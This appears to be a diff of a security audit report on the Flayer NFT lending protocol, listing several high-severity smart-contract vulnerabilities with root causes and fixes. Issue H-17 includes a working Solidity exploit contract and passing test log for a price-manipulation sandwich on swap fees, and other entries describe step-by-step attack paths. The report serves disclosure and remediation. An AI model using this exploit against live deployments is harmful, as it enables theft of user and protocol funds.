-@>>         checkpointKey = keccak256(abi.encodePacked('checkpointIndex', listing.collection));
-            assembly { checkpointIndex := tload(checkpointKey) }
-@>>      if (checkpointIndex == 0) {
-@>>             checkpointIndex = _createCheckpoint(listing.collection);
-                assembly { tstore(checkpointKey, checkpointIndex) }
-            }
+Another case where this happens is the [UniswapImplementation::afterSwap()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/implementation/UniswapImplementation.sol#L617) hook, where collection tokens can be burned.
 
-            tokensIdsLength = listing.tokenIds.length;
-            tokensReceived = _mapListings(listing, tokensIdsLength, checkpointIndex) * 10 ** 
-locker.collectionToken(listing.collection).denomination();
+### Internal pre-conditions
 
-            unchecked {
-@>>             listingCount[listing.collection] += tokensIdsLength;
-            }
+_No response_
 
-@>>         _depositNftsAndReceiveTokens(listing, tokensReceived);
-        }
-```            
+### External pre-conditions
 
-The `_createCheckpoint` **_must be called after the listing is added to the `listingCount[]` and after the changes to the total supply of CT_**, which in this case occurs when `_depositNftsAndReceiveTokens` is called. This function mints new `CT`, impacting the total supply. The total supply directly affects the **utilization rate**, which is used to calculate the compound interest rate.
+_No response_
 
-However, in the current logic, `_createCheckpoint` is called **before** changes that affect the **utilization rate**, the `listingCount[]`, and the `totalSupply`:
+### Attack Path
 
-```solidity
-    function utilizationRate(address _collection)  {
-@>>     listingsOfType_ = listingCount[_collection];
-        if (listingsOfType_ != 0) {
-            ICollectionToken collectionToken = locker.collectionToken(_collection);
-            uint totalSupply = collectionToken.totalSupply();
-            if (totalSupply != 0) {
-@>>             utilizationRate_ = (listingsOfType_ * 1e36 * 10 ** collectionToken.denomination()) / totalSupply;
-            }
-        }
-    }
-```
+This is a problem by itself, as users will pay a wrong interest rate, but it can also be taken advantage of to force users to pay a huge amount of interest or get their protected listings liquidated:
 
-## Impact
-This behavior contradicts the required functionality as stated in the comments in both [Listings.cancelListings()](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/Listings.sol#L466-L467) and [Listings.fillListings()](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/Listings.sol#L602-L603):
+1. Alice creates a new protected listing via [ProtectedListings::createListings()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/ProtectedListings.sol#L117). This is the first protected listing of the collection and as such she expects a low interest rate.
+2. Eve, a liquidity provider, flashloans all of the collection tokens currently in the UniswapV4 pool.
+3. Eve calls [Locker::redeem()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Locker.sol#L209) in order to burn all of the flashloaned collection tokens in the exchange for NFTs. This lowers the total supply of collection tokens and increases the utilization rate.
+4. Eve calls [Listings::cancelListings()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L414) by passing as an emppty array as token ids. This creates a checkpoint for the collection.
+5. Eve calls [Locker::deposit()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Locker.sol#L132) in order to re-deposit the NFT collected during point `3` in exchange for collection tokens.
+6. Eve adds the collection tokens back the UniV4 pool.
 
-```solidity
-@>> // Create our checkpoint as utilization rates will change
-@>> protectedListings.createCheckpoint(listing.collection);
-```
-And in [ProtectedListings.sol](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/ProtectedListings.sol#L480-L481)
-```solidity
-@>>  // Update our checkpoint to reflect that listings have been removed
- @>> _createCheckpoint(_collection);
- ```
- 
-**Root Causes:**
-- **`createCheckpoint` is only called for the first created listing** of a specific collection, not the last one. This means the calculation of the new **checkpoint compoundingFactor** is incorrect, as **utilization rate changes** occur after the checkpoint is created. The increase in **listing count** is not reflected in the checkpoint.
-- **`createCheckpoint` is executed before the minting of `CT`**, which means the total supply and utilization rate are not correctly updated at the time of checkpoint creation.
+This results in Alice having to pay a higher interest rate than expected, which is profitable for Eve, or have her NFT liquidated if the interest rate is so high that the position becomes liquidatable in much less time than she expects.
 
-As a result, this can also lead to **lower interest rates**, which may accrue over time, reducing the overall accuracy of the protocol's interest calculation.
+The worst situation possible is for Alice to create a protected listing by borrowing `1` wei of tokens in a collection that's just been created and whose whole total supply is locked in the UniwapV4 pool. Eve would be able to create a situation where:
 
-## Tool Used
-**Manual Review**
+1. The total supply is `1` (Alice's borrowed token)
+2. The amount of listings is `1` (Alice's listing)
 
-## Recommendation
-Since a user may list multiple collections via `ProtectedListing.sol` or `Listings.sol` through `createListings()`, but for different collections, the best approach is to maintain an array `address[] collections;` to track the **unique collections**. After the loops are executed, perform another loop to call `_createCheckpoint(listing.collection)` for each unique collection.
+which would result in an utilization rate of:
+> (listingsOfType_ * 1e36 * 10 ** collectionToken.denomination()) / totalSupply
 
-# Issue H-12: The `relist` function does not check whether the listing is a liquidation listing causing users to pay taxes and refunds being paid to the listing owner who did not pay taxes 
+> (1 * 1e36 * 10 ** 0) / 1
+
+> 1e36
+
+### Impact
+
+Since the checkpoints are not correctly updated users will pay a wrong interest rate on protected listings no-matter-what. An attacker can abuse this artificially inflate the utilization rate, which is profitable when the attacker is also a liquidity provider in the UniV4 pool.
+
+### PoC
+
+_No response_
+
+### Mitigation
+
+Correctly update collection checkpoints whenever the total supply of collection token changes.
+
+# Issue H-16: The `relist` function does not check whether the listing is a liquidation listing causing users to pay taxes and refunds being paid to the listing owner who did not pay taxes 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/547 
 
@@ -1284,7 +1891,345 @@ Add a check inside the `relist` Function to prevent taxes being paid for listing
 +     }
 ```
 
-# Issue H-13: When relisting a floor item listing, listingCount is not increased, causing listingCount can be underflowed. 
+# Issue H-17: ````UniswapImplementation.beforeSwap()```` is  vulnerable to price manipulation attack 
+
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/559 
+
+## Found by 
+AuditorPraise, BugPull, ComposableSecurity, KingNFT, Thanos, zzykxx
+### Summary
+
+In ````UniswapImplementation.beforeSwap()````, when there is undistributed fee of ````collectionToken````  and users try to swap ````WETH -> collectionToken````, these pending fee of ````collectionToken```` will be firstly swapped. The issue is that the swap here is based on ````current price```` rather than a ````TWAP````, this will make price manipulation attack available.
+
+### Root Cause
+The issue arises on ````UniswapImplementation.sol:508```` ([link](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/implementation/UniswapImplementation.sol#L508)), current market price is fethced, and used for calculating swap token amount on L521 and L536. Per UniswapV4's ````delta```` accounting system, the market price can be easily manipulated even without flashloan. Therefore, attackers can do the following steps in one execution to drain risk free profit from ````UniswapImplementation````:
+(1) Sell some ````collectionTokens```` to decrease price
+(2) Swap with pool fee of ````collectionToken```` at a discount price
+(3) Buy exact ````collectionTokens```` of step1 to increase price back
+```solidity
+File: src\contracts\implementation\UniswapImplementation.sol
+490:     function beforeSwap(address sender, PoolKey calldata key, IPoolManager.SwapParams memory params, bytes calldata hookData) public override onlyByPoolManager returns (bytes4 selector_, BeforeSwapDelta beforeSwapDelta_, uint24 swapFee_) {
+...
+502:         if (trigger && pendingPoolFees.amount1 != 0) {
+...
+508:             (uint160 sqrtPriceX96,,,) = poolManager.getSlot0(poolId); // @audit current price
+...
+513:             if (params.amountSpecified >= 0) {
+...
+520:                 (, ethIn, tokenOut, ) = SwapMath.computeSwapStep({
+521:                     sqrtPriceCurrentX96: sqrtPriceX96,
+...
+526:                 });
+...
+531:             }
+...
+534:             else {
+535:                 (, ethIn, tokenOut, ) = SwapMath.computeSwapStep({
+536:                     sqrtPriceCurrentX96: sqrtPriceX96,
+...
+541:                 });
+...
+556:             }
+...
+580:     }
+
+```
+
+### Internal pre-conditions
+The ````UniswapImplementation```` has collected some fee of ````collectionToken````
+
+### External pre-conditions
+
+N/A
+
+### Attack Path
+
+(1) Sell some collectionTokens to decrease price
+(2) Swap with pool fee of collectionToken at a discount price
+(3) Buy exact collectionTokens of step1 to increase price back
+
+### Impact
+
+Attackers can drain risk free profit from the protocol.
+
+### PoC
+
+The following PoC shows a case that:
+(1) In the normal case, Alice swap ````1 ether```` collectionToken at a cost of ````1.11 ether```` of WETH
+(2) In the attack case, Alice swap ````1 ether```` collectionToken at only cost of ````0.41 ether```` of WETH
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.22;
+
+import {Ownable} from '@solady/auth/Ownable.sol';
+
+import {PoolSwapTest} from '@uniswap/v4-core/src/test/PoolSwapTest.sol';
+import {Hooks, IHooks} from '@uniswap/v4-core/src/libraries/Hooks.sol';
+import {IUnlockCallback} from '@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol';
+import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
+import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
+import {CurrencySettler} from "@uniswap/v4-core/test/utils/CurrencySettler.sol";
+
+import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
+import {IERC721} from '@openzeppelin/contracts/token/ERC721/IERC721.sol';
+
+import {CollectionToken} from '@flayer/CollectionToken.sol';
+import {Locker, ILocker} from '@flayer/Locker.sol';
+import {LockerManager} from '@flayer/LockerManager.sol';
+
+import {IBaseImplementation} from '@flayer-interfaces/IBaseImplementation.sol';
+import {ICollectionToken} from '@flayer-interfaces/ICollectionToken.sol';
+import {IListings} from '@flayer-interfaces/IListings.sol';
+
+import {Currency, CurrencyLibrary} from '@uniswap/v4-core/src/types/Currency.sol';
+import {LPFeeLibrary} from '@uniswap/v4-core/src/libraries/LPFeeLibrary.sol';
+import {PoolKey} from '@uniswap/v4-core/src/types/PoolKey.sol';
+import {PoolIdLibrary, PoolId} from '@uniswap/v4-core/src/types/PoolId.sol';
+import {IPoolManager, PoolManager, Pool} from '@uniswap/v4-core/src/PoolManager.sol';
+import {TickMath} from '@uniswap/v4-core/src/libraries/TickMath.sol';
+import {Deployers} from '@uniswap/v4-core/test/utils/Deployers.sol';
+
+import {FlayerTest} from './lib/FlayerTest.sol';
+import {ERC721Mock} from './mocks/ERC721Mock.sol';
+
+import {BaseImplementation, IBaseImplementation} from '@flayer/implementation/BaseImplementation.sol';
+import {UniswapImplementation} from "@flayer/implementation/UniswapImplementation.sol";
+import {console2} from 'forge-std/console2.sol';
+
+contract AttackHelper is IUnlockCallback {
+    using StateLibrary for IPoolManager;
+    using TransientStateLibrary for IPoolManager;
+    using CurrencySettler for Currency;
+
+    IPoolManager public immutable manager;
+    PoolKey public  poolKey;
+
+    struct CallbackData {
+        address sender;
+        IPoolManager.SwapParams params;
+    }
+
+    constructor(IPoolManager _manager, PoolKey memory _poolKey) {
+        manager = _manager;
+        poolKey = _poolKey;
+    }
+
+    function swap(
+        IPoolManager.SwapParams memory params
+    ) external {
+        manager.unlock(abi.encode(CallbackData(msg.sender, params)));
+    }
+
+    function unlockCallback(bytes calldata rawData) external returns (bytes memory) {
+        CallbackData memory data = abi.decode(rawData, (CallbackData));
+
+        // 1. Sell some collectionTokens to decrease price
+        IPoolManager.SwapParams memory sellParam = IPoolManager.SwapParams({
+            zeroForOne: false, // unflippedToken -> WETH
+            amountSpecified: -10 ether, // exact input
+            sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1
+        });
+        manager.swap(poolKey, sellParam, "");
+
+        // 2. Swap with pool fee at a discount price
+        manager.swap(poolKey, data.params, "");
+
+        // 3. Buy exact collectionTokens of step1 to increase price back
+        IPoolManager.SwapParams memory buyParam = IPoolManager.SwapParams({
+            zeroForOne: true, // WETH -> unflippedToken
+            amountSpecified: 10 ether, // exact input
+            sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
+        });
+        manager.swap(poolKey, buyParam, "");
+
+        int256 delta0 = manager.currencyDelta(address(this), poolKey.currency0);
+        int256 delta1 = manager.currencyDelta(address(this), poolKey.currency1);
+
+        if (delta0 < 0) {
+            poolKey.currency0.settle(manager, data.sender, uint256(-delta0), false);
+        }
+        if (delta1 < 0) {
+            poolKey.currency1.settle(manager, data.sender, uint256(-delta1), false);
+        }
+        if (delta0 > 0) {
+            poolKey.currency0.take(manager, data.sender, uint256(delta0), false);
+        }
+        if (delta1 > 0) {
+            poolKey.currency1.take(manager, data.sender, uint256(delta1), false);
+        }
+        return abi.encode("");
+    }
+}
+
+contract BeforeSwapPriceManupilationAttackTest is Deployers, FlayerTest {
+    using LPFeeLibrary for uint24;
+    using PoolIdLibrary for PoolKey;
+    using StateLibrary for PoolManager;
+
+    address internal constant BENEFICIARY = address(123);
+    uint160 constant SQRT_PRICE_1 = 2**96; // 1 ETH per collectionToken
+    ERC721Mock unflippedErc721;
+    CollectionToken unflippedToken;
+    PoolKey poolKey;
+    AttackHelper attackHelper;
+
+    constructor() {
+        _deployPlatform();
+    }
+
+    function setUp() public {
+        _createCollection();
+        _initCollection();
+        _addSomeFee();
+        attackHelper = new AttackHelper(poolManager, poolKey);
+    }
+
+    function testNormalCase() public {
+        address alice = users[0];
+        _dealNativeToken(alice, 10 ether);
+        _approveNativeToken(alice, address(poolSwap), type(uint).max);
+
+        uint wethBefore = WETH.balanceOf(alice);
+        assertEq(10 ether, wethBefore);
+        uint unflippedTokenBefore = unflippedToken.balanceOf(alice);
+        assertEq(0, unflippedTokenBefore);
+
+        vm.startPrank(alice);
+        poolSwap.swap(
+            poolKey,
+            IPoolManager.SwapParams({
+                zeroForOne: true, // WETH -> unflippedToken
+                amountSpecified: 1 ether, // exact output
+                sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
+            }),
+            PoolSwapTest.TestSettings({
+                takeClaims: false,
+                settleUsingBurn: false
+            }),
+            ''
+        );
+        vm.stopPrank();
+        (uint160 sqrtPriceX96,,,) = poolManager.getSlot0(poolKey.toId());
+        // swap with fee, liquidity pool not been touched
+        assertEq(SQRT_PRICE_1, sqrtPriceX96);
+
+        // swap 1 ether collectionToken with 1.11 ether WETH
+        uint wethAfter = WETH.balanceOf(alice);
+        uint unflippedTokenAfter = unflippedToken.balanceOf(alice);
+        uint wethCost = wethBefore - wethAfter;
+        assertApproxEqAbs(1.11 ether, wethCost, 0.01 ether);
+        uint unflippedTokenReceived = unflippedTokenAfter - unflippedTokenBefore;
+        assertEq(1 ether, unflippedTokenReceived);
+    }
+
+    function testAttackCase() public {
+        address alice = users[0];
+        _dealNativeToken(alice, 10 ether);
+        _approveNativeToken(alice, address(attackHelper), type(uint).max);
+
+        uint wethBefore = WETH.balanceOf(alice);
+        assertEq(10 ether, wethBefore);
+        uint unflippedTokenBefore = unflippedToken.balanceOf(alice);
+        assertEq(0, unflippedTokenBefore);
+
+        vm.startPrank(alice);
+        attackHelper.swap(
+            IPoolManager.SwapParams({
+                zeroForOne: true, // WETH -> unflippedToken
+                amountSpecified: 1 ether, // exact output
+                sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
+            })
+        );
+        vm.stopPrank();
+
+        // swap 1 ether collectionToken with 0.41 ether WETH
+        uint wethAfter = WETH.balanceOf(alice);
+        uint unflippedTokenAfter = unflippedToken.balanceOf(alice);
+        uint wethCost = wethBefore - wethAfter;
+        assertApproxEqAbs(0.41 ether, wethCost, 0.01 ether);
+        uint unflippedTokenReceived = unflippedTokenAfter - unflippedTokenBefore;
+        assertEq(1 ether, unflippedTokenReceived);
+    }
+
+    function _createCollection() internal {
+        while (address(unflippedToken) == address(0)) {
+            unflippedErc721 = new ERC721Mock();
+            address test = locker.createCollection(address(unflippedErc721), 'Flipped', 'FLIP', 0);
+            if (Currency.wrap(test) >= Currency.wrap(address(WETH))) {
+                unflippedToken = CollectionToken(test);
+            }
+        }
+        assertTrue(Currency.wrap(address(unflippedToken)) >= Currency.wrap(address(WETH)), 'Invalid unflipped token');
+    }
+
+    function _initCollection() internal {
+        // This needs to avoid collision with other tests
+        uint tokenOffset = uint(type(uint128).max) + 1;
+
+        // Mint enough tokens to initialize successfully
+        uint tokenIdsLength = locker.MINIMUM_TOKEN_IDS();
+        uint[] memory _tokenIds = new uint[](tokenIdsLength);
+        for (uint i; i < tokenIdsLength; ++i) {
+            _tokenIds[i] = tokenOffset + i;
+            unflippedErc721.mint(address(this), tokenOffset + i);
+        }
+
+        // Approve our {Locker} to transfer the tokens
+        unflippedErc721.setApprovalForAll(address(locker), true);
+
+        // Initialize the specified collection with the newly minted tokens. To allow for varied
+        // denominations we go a little nuts with the ETH allocation.
+        assertTrue(tokenIdsLength == 10);
+        uint startBalance = WETH.balanceOf(address(this));
+        _dealNativeToken(address(this), 10 ether);
+        _approveNativeToken(address(this), address(locker), type(uint).max);
+        locker.initializeCollection(address(unflippedErc721), 10 ether, _tokenIds, _tokenIds.length * 1 ether, SQRT_PRICE_1);
+        _dealNativeToken(address(this), startBalance);
+
+        // storing poolKey
+        poolKey = PoolKey({
+            currency0: Currency.wrap(address(WETH)),
+            currency1: Currency.wrap(address(unflippedToken)),
+            fee: LPFeeLibrary.DYNAMIC_FEE_FLAG,
+            tickSpacing: 60,
+            hooks: IHooks(address(uniswapImplementation))
+        });
+
+        (uint160 sqrtPriceX96,,,) = poolManager.getSlot0(poolKey.toId());
+        assertEq(SQRT_PRICE_1, sqrtPriceX96);
+    }
+
+    function _addSomeFee() internal {
+        vm.prank(address(locker));
+        unflippedToken.mint(address(this), 1 ether);
+        unflippedToken.approve(address(uniswapImplementation), type(uint).max);
+        uniswapImplementation.depositFees(address(unflippedErc721), 0, 1 ether);
+        IBaseImplementation.ClaimableFees memory fees = uniswapImplementation.poolFees(address(unflippedErc721));
+        assertEq(0, fees.amount0);
+        assertEq(1 ether, fees.amount1);
+    }
+}
+
+```
+And the test log:
+```solidity
+2024-08-flayer\flayer> forge test --match-contract BeforeSwapPriceManupilationAttackTest -vv
+[⠢] Compiling...
+[⠊] Compiling 1 files with Solc 0.8.26
+[⠒] Solc 0.8.26 finished in 15.82s
+Compiler run successful!
+
+Ran 2 tests for test/BugBeforeSwapPriceManupilationAttack.t.sol:BeforeSwapPriceManupilationAttackTest
+[PASS] testAttackCase() (gas: 364330)
+[PASS] testNormalCase() (gas: 283375)
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 7.56ms (3.04ms CPU time)
+
+Ran 1 test suite in 29.01ms (7.56ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
+```
+### Mitigation
+Using TWAP, reference: https://blog.uniswap.org/uniswap-v4-truncated-oracle-hook. Or swap ````collectionToken```` to WETH immediately at fee receiving time
+
+# Issue H-18: When relisting a floor item listing, listingCount is not increased, causing listingCount can be underflowed. 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/574 
 
@@ -1328,7 +2273,7 @@ Avoid relisting floor item listings
 OR
 Increase listingCount by one.
 
-# Issue H-14: Owner Can Lose The Token After Being Unlocked but Not Withdrawn 
+# Issue H-19: Owner Can Lose The Token After Being Unlocked but Not Withdrawn 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/601 
 
@@ -1453,12 +2398,12 @@ Manual Review
 
 Modify isListing function: Ensure that tokens marked as canWithdrawAsset are still considered active listings until they are fully withdrawn by their rightful owner.
 
-# Issue H-15: Donation fees are sandwichable in one transaction 
+# Issue H-20: Donation fees are sandwichable in one transaction 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/615 
 
 ## Found by 
-0x37, BugPull, Ironsidesec, araj
+0x37, BugPull, Ironsidesec, ZeroTrust, araj, zzykxx
 ## Summary
 Doesn't matters if MEV is openly possible in the chain, when eevr a user does actions like `liquidateProtectedListing`, `cancelListing`, `modifyListings`, `fillListings`, `Reserve` and `Relist`. They can sandwich the fees donation to make profit or recover the tax they paid. Or, the liquidaton is open access, so you can sandwich that in same tc itself.
 
@@ -1554,7 +2499,7 @@ Manual Review
 ## Recommendation
 Introduce a new way to track how much is donated on this block and limit it on evrery `_donate` call. example, allow only 0.1 ether per block
 
-# Issue H-16: The health of a ```ProtectedListing``` is incorrectly calculated if the ```tokenTaken``` has be changed through ```ProtectedListings::adjustPosition()```. 
+# Issue H-21: The health of a ```ProtectedListing``` is incorrectly calculated if the ```tokenTaken``` has be changed through ```ProtectedListings::adjustPosition()```. 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/689 
 
@@ -1646,7 +2591,199 @@ No PoC needed.
 
 To mitigate this vulnerability successfully, consider updating the checkpoints of the ```ProtectedListing``` whenever an adjustment is happening in the ```position```, so the debt to be compounded correctly.
 
-# Issue H-17: Incorrect index handling in checkpoint creation leads to incorrect initial checkpoint retrieval and potential DoS 
+# Issue H-22: `reserve()` doesn't deletes the `_isLiquidation` mapping, causing tax loss for owner in future 
+
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/698 
+
+## Found by 
+0x37, BADROBINX, BugPull, Ollam, araj, cawfree, h2134, kuprum, utsav, zzykxx
+## Summary
+`reserve()` doesn't deletes the `_isLiquidation` mapping, causing tax loss for owner in future
+
+## Vulnerability Detail
+When a user reserve() a tokenId, it doesn't deletes the `_isLiquidation` mapping. 
+```solidity
+    function reserve(address _collection, uint _tokenId, uint _collateral) public nonReentrant lockerNotPaused {
+//
+        // Check if the listing is a floor item and process additional logic if there
+        // was an owner (meaning it was not floor, so liquid or dutch).
+        if (oldListing.owner != address(0)) {
+            // We can process a tax refund for the existing listing if it isn't a liquidation
+            if (!_isLiquidation[_collection][_tokenId]) {
+                (uint _fees,) = _resolveListingTax(oldListing, _collection, true);
+                if (_fees != 0) {
+                    emit ListingFeeCaptured(_collection, _tokenId, _fees);
+                }
+            }
+
+            // If the floor multiple of the original listings is different, then this needs
+            // to be paid to the original owner of the listing.
+            uint listingFloorPrice = 1 ether * 10 ** collectionToken.denomination();
+            if (listingPrice > listingFloorPrice) {
+                unchecked {
+                    collectionToken.transferFrom(msg.sender, oldListing.owner, listingPrice - listingFloorPrice);
+                }
+            }
+
+            // Reduce the amount of listings
+            unchecked { listingCount[_collection] -= 1; }
+        }
+//
+    }
+```
+
+Let's go step by step to see how this will create problem for the owner:
+1. Suppose a token is liquidated, which set the `_isLiquidation = true` for that tokenId in listing.sol
+2. A user reserved that tokenId(_isLiquidation is not deleted) & withdrawn that token from protectedListing.sol
+3. He listed that tokenId in listing.sol paying tax amount.
+4. Now, if that tokenId is filled then owner should get tax refund amount(if any) but will not receive due to _isLiquidation = true for that tokenId.
+```solidity
+ function _fillListing(address _collection, address _collectionToken, uint _tokenId) private {
+//
+        if (_listings[_collection][_tokenId].owner != address(0)) {
+            // Check if there is collateral on the listing, as this we bypass fees and refunds
+            if (!_isLiquidation[_collection][_tokenId]) {
+                // Find the amount of prepaid tax from current timestamp to prepaid timestamp
+                // and refund unused gas to the user.
+>                (uint fee, uint refund) = _resolveListingTax(_listings[_collection][_tokenId], _collection, false);
+                emit ListingFeeCaptured(_collection, _tokenId, fee);
+//
+    }
+```
+
+
+## Impact
+Lose of tax amount for the user
+
+## Code Snippet
+https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L501C12-L510C18
+https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Listings.sol#L690C4-L759C6
+
+## Tool used
+Manual Review
+
+## Recommendation
+Delete the _isLiquidation mapping in reserve()
+
+# Issue H-23: Lister is overpaying during the cancel of his listing on ```Listings::cancelListings()```. 
+
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/705 
+
+## Found by 
+0x73696d616f, almurhasan, zarkk01
+### Summary
+
+Lister unfairly  double pays the ```tax used``` while he is cancelling his ```listing``` through ```Listings::cancelListings()```.
+
+### Root Cause
+
+When a user is creating his ```listing``` through ```Listings::createListings()```, he is paying upfront the tax that is expected to be used for the whole duration of the ```listing```. However, if he decides to cancel the listing after some time calling ```Listings::cancelListings()```, he will find himself paying again the portion of the tax that has been used until this point. Let's see the ```Listings::cancelListings()``` :
+```solidity
+    function cancelListings(address _collection, uint[] memory _tokenIds, bool _payTaxWithEscrow) public lockerNotPaused {
+        uint fees;
+        uint refund;
+
+        for (uint i; i < _tokenIds.length; ++i) {
+            uint _tokenId = _tokenIds[i];
+
+            // Read the listing in a single read
+            Listing memory listing = _listings[_collection][_tokenId];
+
+            // Ensure the caller is the owner of the listing
+            if (listing.owner != msg.sender) revert CallerIsNotOwner(listing.owner);
+
+            // We cannot allow a dutch listing to be cancelled. This will also check that a liquid listing has not
+            // expired, as it will instantly change to a dutch listing type.
+            Enums.ListingType listingType = getListingType(listing);
+            if (listingType != Enums.ListingType.LIQUID) revert CannotCancelListingType();
+
+            // Find the amount of prepaid tax from current timestamp to prepaid timestamp
+            // and refund unused gas to the user.
+            (uint _fees, uint _refund) = _resolveListingTax(listing, _collection, false);
+            emit ListingFeeCaptured(_collection, _tokenId, _fees);
+
+            fees += _fees;
+            refund += _refund;
+
+            // Delete the listing objects
+            delete _listings[_collection][_tokenId];
+
+            // Transfer the listing ERC721 back to the user
+            locker.withdrawToken(_collection, _tokenId, msg.sender);
+        }
+
+        // cache
+        ICollectionToken collectionToken = locker.collectionToken(_collection);
+
+        // Burn the ERC20 token that would have been given to the user when it was initially created
+@>        uint requiredAmount = ((1 ether * _tokenIds.length) * 10 ** collectionToken.denomination()) - refund;
+@>        payTaxWithEscrow(address(collectionToken), requiredAmount, _payTaxWithEscrow);
+        collectionToken.burn(requiredAmount + refund);
+
+       // ...
+    }
+```
+[Link to code](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/Listings.sol#L414C1-L470C6)
+
+As we can see, user is expected to return back the whole ```1e18 - refund```. It helps to remember that when he created the listing he "took" ```1e18 - TAX``` where, now, ```TAX = refund + fees```. So the user is expected to give back to the protocol ```1e18 - refund``` while he got ```1e18 - refund - fees```. The difference of what he got at the start and what he is expected to return now :
+```md
+whatHeGot - whatHeMustReturn = (1e18 - refund - fees) - (1e18 - refund) = -fees
+```
+So, now the user has to get out of his pocket and pay again for the ```fees``` while, technically, he has paid for them in the start **by not ever taking them**.
+
+Furthermore, in this way, as we can see from [this line](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/Listings.sol#L453), the protocol burns the whole ```1e18``` without considering the ```tax``` that **got actually used** and shouldn't be burned as it will be deposited to the ```UniswapV4Implementation``` :
+```solidity
+collectionToken.burn(requiredAmount + refund);
+```
+
+### Internal pre-conditions
+
+1. User creates a ```listing``` from ```Listings::createListings()```.
+
+### External pre-conditions
+
+1. User wants to cancel his ```listing``` by ```Listings:cancelListings()```.
+
+### Attack Path
+
+1. User creates a ```listing``` from ```Listings::createListings()``` and takes back as ```collectionTokens``` -> ```1e18 - prepaidTax``` .
+2. Some time passes by.
+3. User wants to cancel the ```listing``` by calling ```Listings::cancelListings()``` and he has to give back ```1e18 - unusedTax```. This mean that he has to give also the ```usedTax``` amount.
+
+### Impact
+
+The impact of this serious vulnerability is that the user is forced to double pay the tax that has been used for the duration that his ```listing``` was up. He, firstly, paid for it by not taking it and now, when he cancels the ```listing```, he has to pay it again out of his own pocket. This results to unfair **loss of funds** for whoever tries to cancel his ```listing```.
+
+### PoC
+
+No PoC needed.
+
+### Mitigation
+
+To mitigate this vulnerability successfully, consider not requiring user to return the ```fee``` variable as well :
+```diff
+    function cancelListings(address _collection, uint[] memory _tokenIds, bool _payTaxWithEscrow) public lockerNotPaused {
+        uint fees;
+        uint refund;
+
+        for (uint i; i < _tokenIds.length; ++i) {
+           // ...
+        }
+
+        // cache
+        ICollectionToken collectionToken = locker.collectionToken(_collection);
+
+        // Burn the ERC20 token that would have been given to the user when it was initially created
+-        uint requiredAmount = ((1 ether * _tokenIds.length) * 10 ** collectionToken.denomination()) - refund;
++        uint requiredAmount = ((1 ether * _tokenIds.length) * 10 ** collectionToken.denomination()) - refund - fees;
+        payTaxWithEscrow(address(collectionToken), requiredAmount, _payTaxWithEscrow);
+        collectionToken.burn(requiredAmount + refund);
+
+        // ...
+    }
+```
+
+# Issue H-24: Incorrect index handling in checkpoint creation leads to incorrect initial checkpoint retrieval and potential DoS 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/732 
 
@@ -1812,7 +2949,7 @@ function _createCheckpoint(address _collection) internal returns (uint index_) {
 }
 ```
 
-# Issue H-18: The attacker will prevent eligible users from claiming the liquidated balance 
+# Issue H-25: The attacker will prevent eligible users from claiming the liquidated balance 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/742 
 
@@ -2043,71 +3180,6 @@ function cancel(address _collection) public whenNotPaused {
     emit CollectionShutdownCancelled(_collection);
 }
 ```
-
-# Issue H-19: User can withdraw all N free NFT from Locker for 1 token + txes instead of N token just in one tx. 
-
-Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/756 
-
-## Found by 
-almantare
-## Summary
-
-The Locker stores all NFTs that interact with the protocol. NFTs can enter the locker in the following ways:
-
-- The user lists their NFT for sale in `Listings / ProtectedListings` (these NFTs are locked until the end of the listing). It's worth noting that this method immediately returns `1 Collection Token` to the user.
-- The user exchanges an NFT for `1 Collection Token` using the `Locker::deposit` functions (NFTs that enter the contract this way are available for withdrawal from the Locker using `Locker::redeem`, which in turn burns `1 Collection Token` from the user, returning them an NFT (any free NFT that is on the contract))
-
-Thus, the normal behavior of the protocol assumes the following invariants:
-
-- Free NFTs should be in the Locker so that the user can use the redeem function
